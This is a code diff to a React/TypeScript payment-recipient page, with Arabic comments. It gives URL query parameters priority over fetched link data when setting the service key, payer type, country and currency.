@@ -44,12 +44,14 @@ const PaymentRecipient = () => {
   }, [linkData, isError]);
 
   const urlParams = new URLSearchParams(window.location.search);
-  // دعم Path Parameters + Query Parameters (backward compatible)
-  const serviceKey = pathCompany || urlParams.get('company') || urlParams.get('c') || linkData?.payload?.service_key || urlParams.get('service') || 'aramex';
+  // دعم Path Parameters + Query Parameters (backward compatible) - أولوية لـ URL parameters
+  const serviceKey = pathCompany || urlParams.get('company') || urlParams.get('c') || urlParams.get('service') || linkData?.payload?.service_key || 'aramex';
   const currencyParam = pathCurrency || urlParams.get('currency') || urlParams.get('cur');
   const titleParam = urlParams.get('title');
   const amountParam = pathAmount || urlParams.get('amount') || urlParams.get('a');
   const paymentMethodParam = urlParams.get('pm') || urlParams.get('method') || 'card';
+  const payerTypeParam = urlParams.get('payer_type') || urlParams.get('payer');
+  const countryParam = urlParams.get('country') || urlParams.get('c');
 
   const serviceName = linkData?.payload?.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
@@ -60,9 +62,10 @@ const PaymentRecipient = () => {
   const dynamicDescription = companyMeta.description || `Complete your payment for ${serviceName}`;
   const dynamicImage = companyMeta.image;
 
+  // أولوية للـ query parameters، ثم linkData، ثم defaults
   const shippingInfo = linkData?.payload as Record<string, unknown>;
-  const payerType = shippingInfo?.payer_type || "recipient";
-  const countryCode = shippingInfo?.selectedCountry || "SA";
+  const payerType = payerTypeParam || shippingInfo?.payer_type || "recipient";
+  const countryCode = countryParam || shippingInfo?.selectedCountry || "SA";
   const countryData = getCountryByCode(countryCode);
   const phoneCode = countryData?.phoneCode || "+966";
   const currencyCode = currencyParam || countryData?.currency || "SAR";
